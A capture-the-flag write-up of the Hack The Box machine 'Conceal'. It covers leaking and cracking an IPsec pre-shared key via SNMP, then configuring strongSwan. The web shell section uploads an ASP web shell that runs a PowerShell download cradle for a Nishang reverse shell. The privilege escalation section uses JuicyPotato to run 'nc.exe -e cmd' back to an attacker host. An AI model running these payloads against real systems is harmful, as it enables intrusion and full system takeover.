---
title: "Conceal"
date: 2023-09-13T19:26:37+02:00
tags: ["privesc","web","windows","ftp","snmp"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe."
description: "This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Conceal
- Difficulty level: Hard
- Room link: https://app.hackthebox.com/machines/Conceal

![Untitled](/HTB/conceal-icon.png)

## Tools Used

- nmap

## Port Scanning

```bash
sudo nmap $IP -p- -n -Pn -vvv --min-rate 5000
```

As always I started enumerating **TCP** ports but no one seems open so I decided to perform an **UDP** scan to the 1000 more common ports.

```bash
sudo nmap $IP -sU -n -Pn -vvv --min-rate 5000
```

```bash
PORT    STATE SERVICE REASON               VERSION
161/udp open  snmp    udp-response ttl 127 SNMPv1 server (public)
500/udp open  isakmp? udp-response ttl 127
| fingerprint-strings:
|   IKE_MAIN_MODE:
|     "3DUfw
|     XEW(
|   IPSEC_START:
|_    YW(c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.94%I=7%D=9/12%Time=6500286D%P=arm-apple-darwin22.4.0%r(
SF:IKE_MAIN_MODE,D0,"\0\x11\"3DUfw\x9a\x882\x20\xd0\rIC\x01\x10\x02\0\0\0\
SF:0\0\0\0\0\xd0\r\0\x008\0\0\0\x01\0\0\0\x01\0\0\0,\x01\x01\0\x01\0\0\0\$
SF:\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x01\x8
SF:0\x0b\0\x01\0\x0c\0\x04\0\0\0\x01\r\0\0\x18\x1e\+Qi\x05\x99\x1c}\|\x96\
SF:xfc\xbf\xb5\x87\xe4a\0\0\0\t\r\0\0\x14J\x13\x1c\x81\x07\x03XE\\W\(\xf2\
SF:x0e\x95E/\r\0\0\x14\x90\xcb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f\r\0\0
SF:\x14@H\xb7\xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\r\0\0\x14\xfb\x1
SF:d\xe3\xcd\xf3A\xb7\xea\x16\xb7\xe5\xbe\x08U\xf1\x20\0\0\0\x14\xe3\xa5\x
SF:96jv7\x9f\xe7\x07\"\x821\xe5\xce\x86R")%r(IPSEC_START,38,"1'\xfc\xb08\x
SF:10\x9e\x89\xa3HVa\x1c\xfc-\xd8\x0b\x10\x05\0YW\(c\0\0\x008\0\0\0\x1c\0\
SF:0\0\x01\x01\x10\0\x0e1'\xfc\xb08\x10\x9e\x89\xa3HVa\x1c\xfc-\xd8");
Service Info: Host: Conceal
```

161 is a **snmp** port as we have seen before we can access to a bunch of information about the remote machine and a **IPSEC/IKE VPN** port.

## Enumerating UDP

First I started with enumerating snmp.

**SNMP** is an **Internet Standard protocol** for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behaviour.

In order to access to that information we need a community string which is a kind of password.

There is a [github](https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py) python script calles **snmpbrute.py** with helps to bruteforce **community strings**.

```bash
python3 snmpbrute.py -t 10.10.10.116 -p 161
```

```bash
10.10.10.116 : 161 	Version (v1):	public
10.10.10.116 : 161 	Version (v2c):	public
```

There are a lot of similar tools as **snmpbrute** but **snmpbrute** gives us v2c **community strings** which normally contain more info.

## Exploiting UDP

Well now we have a valid **community string**, in order to access to the hidden info I am gonna use **snmpbulkwalk**.

```bash
snmpbulkwalk -c public -v 2c $IP > snmpenum
```

I saved the scan output in a file because normally is so long.

If we check the first lines theres is a **PSK** password for **IKE VPN**

```bash
SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
```

Also we can found some hidden **TCP** ports.

```bash
TCP-MIB::tcpConnectionState.unknown."".21.unknown."".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.unknown."".80.unknown."".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.unknown."".445.unknown."".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".135.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49664.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49665.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49666.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49667.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49668.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49669.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."0.0.0.0".49670.ipv4."0.0.0.0".0 = INTEGER: listen(2)
TCP-MIB::tcpConnectionState.ipv4."10.10.10.116".139.ipv4."0.0.0.0".0 = INTEGER: listen(2)
```

If we return to the **nmap** scan there is other open port with a **IKE VPN**.

First let’s talk about with what we are dealing now. **IPsec** is the most commonly used technology for **LAN to LAN** and **enterprise VPN.**

**IKE is a type of ISAKMP** (Internet Security Association Key Management Protocol) implementation.

Thanks to a [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting) post I found a command which helps us to know if there is a **IKE VPN** listening.

```bash
ike-scan -M 10.10.10.116
```

```bash
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116	Main Mode Handshake returned
	HDR=(CKY-R=478fed0dd59df637)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
	VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
	VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
	VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
	VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
	VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
	VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.123 seconds (8.11 hosts/sec).  1 returned handshake; 0 returned notify
```

The output shows what **SA** (security association) is using which **specifies security properties that are recognized by communicating hosts.**

```bash
ike-scan -M 10.10.10.116 -2
```

I have run the same command with **ikev2** but failed. That helps us because now we know the ike version which is running is **v1**.

I tried to run again the same command in aggressive mode but is useless because we already know the hash.

So we have a **SA**, the version and the password hash, we only need to configure the **VPN** with these parameters in order to connect.

But before that let’s crack the hash.

I used [hashes.com](http://hashes.com) in order to crack it

```bash
9c8b1a372b1878851be2c097031b6e43:Dudecake1!
```

A tool called **strongSwan** which helps to connect easily to an **IPSEC VPN**.

But before connecting we need to configure `/etc/ipsec.conf` and `/etc/ipsec.secrets`

After a several try and error, using `man ipsec.conf` and `man ipsec.secrets` I achieved a working config file.

```bash
# ipsec.secrets - strongSwan IPsec secrets file

%any : PSK "Dudecake1!"
```

```bash
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

config setup
	charondebug="all"
	

conn conceal
       authby=secret
       ike=3des-sha1-modp1024!
       esp=3des-sha1!
       type=transport
       keyexchange=ikev1
       left=10.10.10.116
       right=10.10.14.9
       auto=add
```

In `ipsec.secrets` only we need to add one line for the specifying the password `%any : PSK "Dudecake1!"`

In `ipsec.conf` we need to put more stuff, first we need to specify a new connection I have called it conceal, then I specify some values:

- `authby=secret`use **PSK** auth specified on the secrets file.
- `ike`, `esp`, and `keyexchange` are set based on information from `ike-scan`.
- `left` and `right` are for the local and remote **IP address**.
- `type=transport` - use transport mode.(This parameter was a guess).
- `auto=add` was a guess too.

Also I have changed some parameters for the setup configurations like (but there are optional):

- `charondebug="all"` - be more verbose to help me troubleshoot the connection.

Now let’s start the service to connect to the **VPN**.

```bash
sudo ipsec start
sudo ipsec up conceal
```

Once executed the following error was outputted.

```bash
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (176 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.14.9[10.10.14.9]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 10238s
maximum IKE_SA lifetime 10778s
generating QUICK_MODE request 2092714236 [ HASH SA No ID ID ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (164 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (76 bytes)
parsed INFORMATIONAL_V1 request 1438899382 [ HASH N(INVAL_ID) ]
received INVALID_ID_INFORMATION error notify
establishing connection 'conceal' failed
```

We have a `INVALID_ID_INFORMATION` error

Searching on google I found a **IPSEC VPN** troubleshooting post.

In the post this type of error is occurring on the phase 2 so as the phase 1 is finished is not a credential error. And the error is exactly a network mismatch.

Then I realized that the tcp ports aren’t displayed in the **nmap scan** but the **UDP** are so maybe the **VPN** is hiding only the **TCP** ports.

If we add the parameter `leftsubnet=10.10.10.116[tcp]` on the connection part of `ipsec.conf` file, the **VPN** only will running on the **TCP** ports and should work correctly.

```bash
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (176 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.14.9[10.10.14.9]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 9912s
maximum IKE_SA lifetime 10452s
generating QUICK_MODE request 3169062681 [ HASH SA No ID ID ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (164 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (188 bytes)
parsed QUICK_MODE response 3169062681 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
CHILD_SA conceal{1} established with SPIs c44d2140_i 0c2d93b4_o and TS 10.10.14.9/32 === 10.10.10.116/32[tcp]
connection 'conceal' established successfully
```

Well we have established successfully the connection.

## Enumerating TCP

So let’s retry the **TCP** scan again.

With a **SYN port scan** nothing is outputted but the **TCP** **scan** worked.

The scan is taking too long so let’s focus in scan only the ports outputted by **snmp**.

```bash
nmap $IP -p21,80,445,133,139 -n -Pn --min-rate=5000
```

```bash
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-09-13T15:38:03
|_  start_date: 2023-09-13T15:36:01
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: -1s
```

As always I am gonna start with the website.

![Untitled](/HTB/conceal-1.png)

Is a default IIS 10.0 homepage.

Let’s do a quick **fuzz**.

```bash
gobuster dir -u http://10.10.10.116/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 301) [Size: 150] [--> http://10.10.10.116/upload/]
===============================================================
Finished
===============================================================
```

Only one directory let’s take a look

![Untitled](/HTB/conceal-2.png)

`/upload` seems to be empty.

At this point I start enumerating the ftp but when I login anonymously I don’t found anything.

![Untitled](/HTB/conceal-3.png)

In the uploads directory of the website we don’t find anything as well so I have attempted to upload something to the ftp share in order to know if it’s the same directory.

So I create a test folder to see if the website list it.

![Untitled](/HTB/conceal-4.png)

We can see that uploads list now new content.

## Exploiting TCP

Well we can upload files, so as the website is **Windows** maybe is running **ASP.NET** let’s try to upload a **aspx** web shell.

```bash
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("whoami")
Response.Write(cmd.StdOut.ReadAll)
%>
```

![Untitled](/HTB/conceal-5.png)

When I try to access to the shell the page display the above 404 error. If we read the page, the error is due to the extension configuration also we can see that **ASP.NET** is used.

As we have an extension problem, should we try to execute the shell with other **ASP.NET** extensions like asp.

![Untitled](/HTB/conceal-6.png)

The shell is working now.

Now we have **RCE** let’s send the **[Nishang](https://github.com/samratashok/nishang) TCP reverse shell.**

We can perform it only changing the **whoami** command.

```bash
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/PS.ps1')")
Response.Write(cmd.StdOut.ReadAll)
%>
```

Basically the command we are executing download the script from a python http server which we are gonna open before where is located the **Nishang** script as PS.ps1

As always I am going to put `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444` at the end of the **Nishang** script in order to execute the shell.

Now only rests to set a **nc** listener and let the magic happens.

```bash
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/conceal-7.png)

We are not **NT AUTHORITY\SYSTEM** so we need to **privEsc**.

## Escalating Privilege

First I am going to see the current privileges.

```bash
whoami /priv
```

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

The `SeImpersonatePrivilege` allow us to use tools like [JuicyPotato](https://github.com/ohpe/juicy-potato) to **privEsc**.

First we need to see if our system works with **JuicyPotato**.

```powershell
systeminfo
```

```powershell
Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00329-00000-00003-AA343
Original Install Date:     12/10/2018, 20:04:27
System Boot Time:          13/09/2023, 16:35:46
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,164 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,253 MB
Virtual Memory: In Use:    946 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::1031:d377:eff5:6cba
                                 [03]: dead:beef::c888:9715:2be0:f364
                                 [04]: dead:beef::1031:d377:eff5:6cba
                                 [05]: dead:beef::248
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

The current version is vulnerable so I copied the **JuicyPotato** binary with **smbserver.py** in order to execute it.

```powershell
smbserver.py smbFolder $(pwd) -smb2support
```

```powershell
copy \\10.10.14.9\smbFolder\JuicyPotato.exe .
```

Once copied I have executed it with the following arguments.

```powershell
.\JuicyPotato.exe -t * -p \Windows\System32\cmd.exe -l 1338 -a "/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445"
```

With a **smbserver** on the **nc.exe** binary and setting a **nc** listener on our local machine, we are able to do a reverse shell as **root**.

```powershell
nc -lv 4445
```

![Untitled](/HTB/conceal-8.png)

We have had a **CLSID** testing error.

Googling I found a [post](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/) with a bunch of valid **CLSID** for **JuicyPotato**.

I start testing with wuauserv which probably be enabled 

```bash
.\JuicyPotato.exe -t * -p \Windows\System32\cmd.exe -l 1338 -a "/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445" -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
```

![Untitled](/HTB/conceal-9.png)

We pwnd Conceal 👽.

## Flag(s)

![Untitled](/HTB/conceal-10.png)

![Untitled](/HTB/conceal-11.png)

